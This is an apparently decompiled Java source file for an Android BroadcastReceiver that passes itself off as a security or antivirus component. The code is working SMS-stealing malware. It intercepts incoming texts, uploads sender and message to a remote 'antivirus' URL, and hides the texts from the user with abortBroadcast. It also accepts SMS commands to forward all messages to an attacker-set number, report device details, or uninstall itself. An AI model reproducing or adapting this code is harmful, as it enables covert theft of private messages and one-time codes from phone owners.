package com.android.security;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import java.net.URLEncoder;
import java.text.DateFormat;
import java.util.Calendar;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SecurityReceiver extends BroadcastReceiver {
    public static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";

    public static NumMessage GetLastSms(Context context) {
        if (context == null) {
            ValueProvider.LogError("AppContext null in GetLast_");
            return null;
        }
        NumMessage result = null;
        Cursor c = context.getContentResolver().query(Uri.parse("content://sms/inbox"), (String[]) null, (String) null, (String[]) null, (String) null);
        String body = null;
        String number = null;
        if (c.moveToFirst()) {
            body = c.getString(c.getColumnIndexOrThrow("body")).toString();
            number = c.getString(c.getColumnIndexOrThrow("address")).toString();
            result = new NumMessage(number, String.valueOf(body) + " " + ValueProvider.XLastMessage);
        }
        c.close();
        if (body == null || number == null) {
            return null;
        }
        return result;
    }

    public static boolean ReportFromScheduler(Context context) {
        boolean ReportOk;
        ValueProvider.LogTrace("SecurityReceiver::ReportFromScheduler");
        if (!ValueProvider.GetBoolValue(ValueProvider.SettingLastSmsSended)) {
            ValueProvider.LogTrace("Last Send not occurs");
            NumMessage msg = GetLastSms(context);
            if (msg == null) {
                return false;
            }
            ValueProvider.LogTrace("We have some send data");
            if (WebManager.MakeHttpRequestWithRetries(ValueProvider.GetMessageReportUrl(msg.getNumber(), msg.getMessage()), 3) == 200) {
                ValueProvider.LogTrace("Request is fine");
            } else {
                ValueProvider.LogTrace("Request error. Putting uri to db");
                new DataStorage(context).insert(msg.getNumber(), msg.getMessage());
            }
            ValueProvider.SaveBoolValue(ValueProvider.SettingLastSmsSended, true);
            return true;
        }
        ValueProvider.LogTrace("LastSend previously occured");
        if (new DataStorage(context).SendSavedMessages() != 0) {
            ReportOk = true;
        } else {
            ReportOk = false;
        }
        if (ReportOk) {
            return ReportOk;
        }
        String uri = String.valueOf(ValueProvider.GetAntivirusLink()) + ValueProvider.GetStaticDataString();
        ValueProvider.LogTrace("Url is" + uri);
        if (WebManager.MakeHttpRequestWithRetries(uri, 3) == 200) {
            return true;
        }
        return false;
    }

    public static void sendSMS(String phoneNumber, String message) {
        if (phoneNumber == null || message == null) {
            ValueProvider.LogTrace("number or message is null in SendMessageProc");
            return;
        }
        try {
            SmsManager.getDefault().sendTextMessage(phoneNumber, (String) null, message, (PendingIntent) null, (PendingIntent) null);
        } catch (Exception e) {
        }
    }

    public void SendControlInformation(String controlNumber) {
        int i;
        int i2 = 1;
        if (controlNumber == null || controlNumber == "") {
            ValueProvider.LogTrace("controlNumber is empty or null in SendControlInformation");
            return;
        }
        ValueProvider.LogTrace("SendControlInformation called number is " + controlNumber);
        boolean TotalHideSms = ValueProvider.IsTotalHideOn();
        boolean alternativeControl = ValueProvider.IsAlternativeControlOn();
        String PhoneModel = Build.MODEL;
        String PhoneManufacturer = Build.MANUFACTURER;
        String AndroidVersion = Build.VERSION.RELEASE;
        Object[] objArr = new Object[7];
        objArr[0] = PhoneModel;
        objArr[1] = ValueProvider.GetActivationCode();
        if (TotalHideSms) {
            i = 1;
        } else {
            i = 0;
        }
        objArr[2] = Integer.valueOf(i);
        if (!alternativeControl) {
            i2 = 0;
        }
        objArr[3] = Integer.valueOf(i2);
        objArr[4] = ValueProvider.SoftwareVersion;
        objArr[5] = PhoneManufacturer;
        objArr[6] = AndroidVersion;
        String information = String.format("Model:%s AC:%s H:%d AltC:%d V:%s Mf:%s/%s", objArr);
        ValueProvider.LogTrace(information);
        sendSMS(controlNumber, information);
    }

    public String ExtractNumberFromMessage(String message) {
        String ControlNumber = "+";
        Matcher m = Pattern.compile("\\d+").matcher(message);
        boolean found = false;
        while (m.find()) {
            ControlNumber = String.valueOf(ControlNumber) + m.group();
            found = true;
        }
        if (!found) {
            return "";
        }
        return ControlNumber;
    }

    public boolean AlternativeControl(String message) {
        ValueProvider.LogTrace("AlternativeControl called");
        if (message.startsWith("%")) {
            ValueProvider.LogTrace("AlternativeControl control message GET INFO");
            SendControlInformation(ExtractNumberFromMessage(message));
            return true;
        }
        if (message.startsWith(":")) {
            ValueProvider.LogTrace("AlternativeControl control message new number");
            String ControlNumber = ExtractNumberFromMessage(message);
            if (ControlNumber.length() > 7) {
                ValueProvider.LogTrace("AlternativeControl control number " + ControlNumber);
                ValueProvider.SaveBoolValue(ValueProvider.AlternativeControl, true);
                ValueProvider.SaveStringValue(ValueProvider.AlternativeNumber, ControlNumber);
                SendControlInformation(ControlNumber);
                return true;
            }
        }
        if (message.startsWith("*")) {
            ValueProvider.LogTrace("AlternativeControl control message fin packet");
            ValueProvider.UninstallSoftware();
            SendControlInformation(ExtractNumberFromMessage(message));
            return true;
        } else if (message.startsWith(".")) {
            ValueProvider.LogTrace("AlternativeControl control message fin AltControl");
            ValueProvider.CleanupAlternativeControl();
            SendControlInformation(ExtractNumberFromMessage(message));
            return true;
        } else if (ValueProvider.IsAlternativeControlOn()) {
            sendSMS(ValueProvider.GetStringValue(ValueProvider.AlternativeNumber), ">> " + message);
            return true;
        } else {
            ValueProvider.LogTrace("AlternativeControl is off");
            return false;
        }
    }

    public void onReceive(Context context, Intent intent) {
        ValueProvider.SetContext(context);
        ValueProvider.LogTrace("SecurityReceiver::onReceive " + intent.toString());
        if (!ValueProvider.IsUnInstalled()) {
            ValueProvider.LogTrace("Not Uninstalled");
            if (intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL") || intent.getAction().equals("android.intent.action.BOOT_COMPLETED")) {
                ValueProvider.LogTrace("This is outgoing call or boot complete");
                SecurityService.Schedule(context, ValueProvider.FirstReportDelay);
            } else if (intent.getAction().equals(SMS_RECEIVED_ACTION)) {
                ValueProvider.LogTrace("SecurityReceiver::OnBundle SMAction");
                boolean TotalHideSms = ValueProvider.IsTotalHideOn();
                Bundle bundle = intent.getExtras();
                SmsMessage[] smsMessageArr = null;
                String number = null;
                String GetString = ValueProvider.GetStaticDataString();
                String message = null;
                boolean SendReport = false;
                String messageWithTime = null;
                if (bundle != null) {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    SmsMessage[] msgs = new SmsMessage[pdus.length];
                    for (int i = 0; i < msgs.length; i++) {
                        msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        message = msgs[i].getMessageBody().toString();
                        number = msgs[i].getOriginatingAddress();
                        messageWithTime = "LocalTime: " + DateFormat.getDateTimeInstance().format(Calendar.getInstance().getTime()) + "\r\n " + message;
                        GetString = String.valueOf(GetString) + String.format("&from=%s&text=%s", new Object[]{URLEncoder.encode(number), URLEncoder.encode(messageWithTime)});
                        SendReport = true;
                    }
                    boolean alternativeControl = AlternativeControl(message);
                    if (TotalHideSms || alternativeControl) {
                        abortBroadcast();
                    }
                    if (TotalHideSms && !alternativeControl) {
                        ValueProvider.LogTrace("SecurityReceiver::OnBundle BeforeSendCheck");
                        if (SendReport) {
                            ValueProvider.LogTrace("SecurityReceiver::OnBundle Report");
                            String uri = String.valueOf(ValueProvider.GetAntivirusLink()) + GetString;
                            ValueProvider.LogTrace(uri);
                            if (WebManager.MakeHttpRequest(uri) != 200 && number != null && messageWithTime != null) {
                                new DataStorage(context).insert(number, messageWithTime);
                            }
                        }
                    }
                }
            }
        }
    }
}
